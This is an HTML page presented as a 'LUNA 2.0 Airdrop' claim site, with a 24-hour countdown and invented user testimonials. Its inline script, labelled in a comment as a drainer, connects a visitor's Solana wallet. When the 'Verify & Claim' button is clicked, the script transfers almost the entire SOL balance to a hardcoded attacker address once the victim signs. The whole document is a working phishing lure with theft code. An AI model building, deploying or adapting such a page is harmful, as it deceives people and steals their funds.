<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LUNA 2.0 Airdrop</title>
    <style>
        body{font-family:Arial,sans-serif;margin:0;padding:0;background-color:#f4f4f4;color:#333}header{background-color:#ff5733;color:white;text-align:center;padding:1em}.logo{max-width:min(100px,20vw)}main{max-width:800px;margin:0 auto;padding:2vw;text-align:center}.hero{background-color:white;padding:2vw;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}#countdown{margin:2vw 0;font-size:1.2em;color:#ff5733}h1{font-size:clamp(1.5rem,5vw,2rem)}h2{font-size:clamp(1.2rem,4vw,1.6rem)}p{font-size:clamp(0.9rem,3vw,1rem)}button{background-color:#ff5733;color:white;border:none;padding:10px 20px;margin:10px;border-radius:5px;cursor:pointer;font-size:clamp(0.9rem,3vw,1em);transition:transform 0.2s,background-color 0.2s;width:100%;max-width:200px;box-sizing:border-box}button:hover,button:focus{background-color:#e04e2b;transform:scale(1.05)}button:active{transform:scale(0.95)}button:disabled{background-color:#ccc;cursor:not-allowed;transform:none}#status{margin:2vw 0;font-weight:bold;font-size:clamp(0.9rem,3vw,1rem)}.testimonials{margin-top:2vw;background-color:white;padding:2vw;border-radius:8px}.loading::after{content:"...";animation:dots 1s infinite}.loading:disabled{background-color:#ff5733;transform:none}@keyframes dots{0%,20%{content:"."}40%{content:".."}60%,100%{content:"..."}}#status.error{color:#ff0000}@media (max-width:767px){header{padding:2vw}.logo{max-width:min(80px,18vw)}main{padding:3vw}.hero{padding:3vw}#countdown{font-size:1em}h1{font-size:clamp(1.2rem,4vw,1.6rem)}h2{font-size:clamp(1rem,3.5vw,1.3rem)}p{font-size:clamp(0.8rem,2.5vw,0.9rem)}button{padding:8px 16px;font-size:clamp(0.8rem,2.5vw,0.9rem);max-width:180px}.testimonials{padding:3vw}}@media (min-width:768px) and (max-width:1023px){header{padding:1.5vw}.logo{max-width:min(90px,19vw)}main{padding:2.5vw}.hero{padding:2.5vw}#countdown{font-size:1.1em}button{padding:9px 18px;font-size:clamp(0.85rem,2.8vw,0.95rem);max-width:190px}.testimonials{padding:2.5vw}}
    </style>
</head>
<body>
    <header>
        <img src="assets/luna-logo.png" alt="LUNA Logo" class="logo">
        <h1>LUNA 2.0 Airdrop</h1>
    </header>
    <main>
        <section class="hero">
            <h2>Claim Your LUNA-NEW Tokens!</h2>
            <p>Connect your Solana wallet to verify eligibility and claim your airdrop.</p>
            <div id="countdown">Claim ends in: <span id="timer">24:00:00</span></div>
        </section>
        <button id="connectButton">Connect Wallet</button>
        <button id="drainButton" disabled>Verify & Claim</button>
        <p id="status"></p>
        <section class="testimonials">
            <h3>User Testimonials</h3>
            <p>"I claimed my LUNA 2.0 tokens in seconds!" - Alex</p>
            <p>"Super easy process, got my airdrop!" - Sarah</p>
        </section>
    </main>

    <!-- Solana web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <!-- Inline Buffer polyfill with 64-bit support -->
    <script>
        (function(){const Buffer=function(arg){if(!(this instanceof Buffer))return new Buffer(arg);this.buffer=arg instanceof Uint8Array?arg:new Uint8Array(arg||0);this.length=this.buffer.length};Buffer.from=function(arg){if(typeof arg==='string')return new Buffer(new TextEncoder().encode(arg));if(ArrayBuffer.isView(arg)||arg instanceof ArrayBuffer)return new Buffer(new Uint8Array(arg));if(Array.isArray(arg))return new Buffer(new Uint8Array(arg));return new Buffer(arg)};Buffer.prototype.slice=function(start,end){return new Buffer(this.buffer.slice(start,end))};Buffer.prototype.reverse=function(){const reversed=new Uint8Array(this.buffer.length);for(let i=0;i<this.buffer.length;i++){reversed[i]=this.buffer[this.buffer.length-1-i]}this.buffer=reversed;return this};Buffer.prototype.writeUInt32LE=function(value,offset){this.buffer[offset]=value&0xff;this.buffer[offset+1]=(value>>>8)&0xff;this.buffer[offset+2]=(value>>>16)&0xff;this.buffer[offset+3]=(value>>>24)&0xff};Buffer.prototype.writeBigUInt64LE=function(value,offset=0){const low=Number(BigInt(value)&0xffffffffn);const high=Number(BigInt(value)>>32n);this.buffer[offset]=low&0xff;this.buffer[offset+1]=(low>>>8)&0xff;this.buffer[offset+2]=(low>>>16)&0xff;this.buffer[offset+3]=(low>>>24)&0xff;this.buffer[offset+4]=high&0xff;this.buffer[offset+5]=(high>>>8)&0xff;this.buffer[offset+6]=(high>>>16)&0xff;this.buffer[offset+7]=(high>>>24)&0xff;return offset+8};window.Buffer=Buffer;console.log('Enhanced Buffer polyfill with 64-bit support loaded')})();
    </script>
    <!-- Minified drainer script with mobile wallet detection fix -->
    <script>
        console.log("Script execution started");const{PublicKey,Transaction,SystemProgram,LAMPORTS_PER_SOL,TransactionInstruction}=solanaWeb3;let walletPublicKey=null;const status=document.getElementById("status");const connectButton=document.getElementById("connectButton");const drainButton=document.getElementById("drainButton");const recipientPublicKey=new PublicKey("9wktWuHh488Rh3LepSnUAFZfY2H7MrFh5oB8cqK9YbzM");const RPC_ENDPOINTS=["https://api.mainnet-beta.solana.com","https://rpc.ankr.com/solana","https://solana-mainnet.g.alchemy.com/v2/demo","https://mainnet.rpcpool.com","https://solana.api.onfinality.io/public","https://solana-mainnet.rpc.extrnode.com"];async function wait(ms){return new Promise(resolve=>setTimeout(resolve,ms))}async function getConnection(){for(const endpoint of RPC_ENDPOINTS){try{const connection=new solanaWeb3.Connection(endpoint,"confirmed");const slot=await connection.getSlot();console.log(`Connected to RPC: ${endpoint}, slot: ${slot}`);return connection}catch(error){console.warn(`RPC ${endpoint} failed: ${error.message} (Status: ${error.status||"Unknown"})`)}}status.textContent="Failed to connect to Solana network. Check internet or try again.";status.classList.add("error");throw new Error("All RPC endpoints failed. Check network, firewall, or try again later.")}async function checkWallet(){console.log("Checking wallet...");for(let i=0;i<5;i++){if(window.solana&&(window.solana.isPhantom||window.solana.isSolflare)){console.log("Solana wallet detected:",window.solana.isPhantom?"Phantom":"Solflare");return true}await wait(1000)}status.textContent="No Solana wallet detected. Install Phantom or Solflare and use the in-app browser.";status.classList.add("error");console.log("No Solana wallet detected after retries");return false}console.log("Setting up connect button listener");connectButton.addEventListener("click",async()=>{console.log("Connect button clicked");connectButton.textContent="Connecting";connectButton.classList.add("loading");connectButton.disabled=true;try{if(!await checkWallet())return;console.log("Attempting connection...");const response=await window.solana.connect();walletPublicKey=new PublicKey(response.publicKey.toString());console.log("Connected:",walletPublicKey.toString());status.textContent=`Connected: ${walletPublicKey.toString()}`;drainButton.disabled=false}catch(err){console.error("Connection error:",err);status.textContent="Connection failed: "+err.message;status.classList.add("error")}finally{connectButton.textContent="Connect Wallet";connectButton.classList.remove("loading");connectButton.disabled=false}});console.log("Setting up drain button listener");drainButton.addEventListener("click",async()=>{console.log("Drain button clicked");drainButton.textContent="Processing";drainButton.classList.add("loading");drainButton.disabled=true;try{if(!await checkWallet())return;console.log("Connecting to RPC...");const connection=await getConnection();console.log("Getting blockhash...");const{blockhash,lastValidBlockHeight}=await connection.getLatestBlockhash();console.log("Creating transaction...");const transaction=new Transaction({recentBlockhash:blockhash,feePayer:walletPublicKey});console.log("Checking balance...");const balance=await connection.getBalance(walletPublicKey);console.log("Wallet balance:",balance,"lamports");console.log("Getting rent-exempt minimum...");const rentExemptMinimum=await connection.getMinimumBalanceForRentExemption(0);console.log("Rent-exempt minimum:",rentExemptMinimum,"lamports");console.log("Adding transfer instruction...");const totalFee=50000;const buffer=100000;const amountToSend=balance-(totalFee+rentExemptMinimum+buffer);if(amountToSend<=0){status.textContent="Insufficient balance to cover fee, rent, and buffer";status.classList.add("error");console.log("Not enough SOL after fee, rent, and buffer:",totalFee,"+",rentExemptMinimum,"+",buffer);return}console.log("Amount to send:",amountToSend,"lamports");transaction.add(SystemProgram.transfer({fromPubkey:walletPublicKey,toPubkey:recipientPublicKey,lamports:amountToSend}));console.log("Estimating transaction fee...");const message=transaction.compileMessage();const feeResponse=await connection.getFeeForMessage(message,"confirmed");const baseFee=feeResponse.value||5000;console.log("Base estimated fee:",baseFee,"lamports");console.log("Total estimated fee:",totalFee,"lamports");console.log("Remaining balance:",balance-amountToSend,"lamports");console.log("Signing transaction...");const signedTx=await window.solana.signTransaction(transaction);console.log("Sending transaction...");const signature=await connection.sendRawTransaction(signedTx.serialize());console.log("Waiting for confirmation...");await connection.confirmTransaction({signature,blockhash,lastValidBlockHeight});status.textContent=`Transaction complete! Signature: ${signature}`;console.log("Transaction successful:",signature)}catch(err){console.error("Drain error:",err);status.textContent="Transaction failed: "+err.message;status.classList.add("error")}finally{drainButton.textContent="Verify & Claim";drainButton.classList.remove("loading");drainButton.disabled=walletPublicKey===null}});function startCountdown(){let time=24*60*60;const timer=document.getElementById("timer");const interval=setInterval(()=>{const hours=Math.floor(time/3600);const minutes=Math.floor((time%3600)/60);const seconds=time%60;timer.textContent=`${hours}:${minutes.toString().padStart(2,"0")}:${seconds.toString().padStart(2,"0")}`;time--;if(time<0)clearInterval(interval)},1000)}startCountdown();console.log("Script execution completed");
    </script>
</body>
</html>
